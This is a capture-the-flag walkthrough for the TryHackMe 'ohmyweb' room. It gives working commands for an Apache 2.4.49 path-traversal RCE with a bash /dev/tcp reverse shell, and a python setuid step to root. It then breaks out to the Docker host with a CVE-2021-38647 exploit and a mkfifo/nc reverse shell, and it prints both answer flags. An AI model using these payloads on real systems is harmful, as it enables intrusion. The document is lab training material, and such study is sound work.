# Bebop Walkthrough
### Link
- https://tryhackme.com/room/ohmyweb
---
### Recon
```
nmap -sC -sC -Pn [IP]
```
**Namp scan result**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-14 21:20 EDT
Nmap scan report for 10.10.139.186
Host is up (0.098s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.47 seconds
```
Let's check the webpage http://[IP]. We arrive to a static webpage.
```
sudo gobuster dir -u http://[IP] -w ~/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt
```
**Gobuster scan result**
```

```
We have found two reporteries **cgi** and **assets** and from the nmap scan, we know this server is based on **Apache 2.4.49**

Quick check on [exploit-db](https://www.exploit-db.com/exploits/50383) --> Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
---
### Exploit

Quick search on internet and I found that: [rce](https://www.exploit-db.com/exploits/50383). From this exploit, let's create a reverse shell.

Start a listener
```
nc -nlvp 4646
```
Execute the exploit
```
curl 'http://10.10.139.186/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.6.96.167/4646 0>&1'
```
Result into the listener:
```
% nc -nlvp 4646
Connection from 10.10.139.186:44638
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ whoami
whoami
daemon
```

Run the following to get root in the container:
```
/usr/bin/python3.7 -c ‘import os; os.setuid(0); os.system(“/bin/bash”);’
```
```
daemon@4a70924bafa0:/$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@4a70924bafa0:/# whoami
whoami
root
root@4a70924bafa0:/# cd root
cd root
root@4a70924bafa0:/root# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 38 Oct  8 05:47 user.txt
root@4a70924bafa0:/root# cat user.txt
cat user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```
**Question**
#### user.txt 
**Answer** 
#### THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
---
### Privilege Escalation

- First: Few enumeration around the target machine
```
root@4a70924bafa0:/root# netstat -tulpn
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
root@4a70924bafa0:/root# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 180711  bytes 20493915 (19.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 95915  bytes 39235223 (37.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
``` 
We found the IP 172.17.0.1. Maybe the asset which run the Docker. Let's Upload nmap into the machine and perform a quick enumeration ^^
```
./nmap -sT -p- 172.17.0.1

Host is up (0.0044s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:19:6E:E8:C1 (Unknown)
```
After a quick serahc on internet、I found this [CVE](https://github.com/AlteredSecurity/CVE-2021-38647)

- First : Download the exploit
```
 wget https://raw.githubusercontent.com/AlteredSecurity/CVE-2021-38647/main/CVE-2021-38647.py
--2022-03-14 21:59:09--  https://raw.githubusercontent.com/AlteredSecurity/CVE-2021-38647/main/CVE-2021-38647.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5246 (5.1K) [text/plain]
Saving to: ‘CVE-2021-38647.py’

CVE-2021-38647.py         100%[==================================>]   5.12K  --.-KB/s    in 0s

2022-03-14 21:59:10 (13.5 MB/s) - ‘CVE-2021-38647.py’ saved [5246/5246]
```
- Second: Create a web server to be able to download the exploit
```
python3 -m http.server 8080
Serving HTTP on :: port 8080 (http://[::]:8080/) ...
::ffff:10.10.139.186 - - [14/Mar/2022 22:01:43] code 404, message File not found
::ffff:10.10.139.186 - - [14/Mar/2022 22:01:43] "GET /exploit.py HTTP/1.1" 404 -
```

- Third: Download the exploit
```
curl http://10.6.96.167:8080/CVE-2021-38647.py -o exploit.py
<://10.6.96.167:8080/CVE-2021-38647.py -o exploit.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5243  100  5243    0     0  19065      0 --:--:-- --:--:-- --:--:-- 18996
```
- Fourth: start a new listener
```
nc -nlvp 4647
```
- Fifth: Use the exploit
```
root@4a70924bafa0:/root# python3 exploit.py -t 172.17.0.1 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.6.96.167 4647  >/tmp/f"
<t /tmp/f|bash -i 2>&1|nc 10.6.96.167 4647  >/tmp/f"
```
- Sixth: Listener result
```
root@ubuntu:/var/opt/microsoft/scx/tmp# cat /root/root.txt
cat /root/root.txt
THM{7f147ef1f36da9ae29529890a1b6011f}
```
**Question**
#### root.txt
**Answer** 
#### THM{7f147ef1f36da9ae29529890a1b6011f}
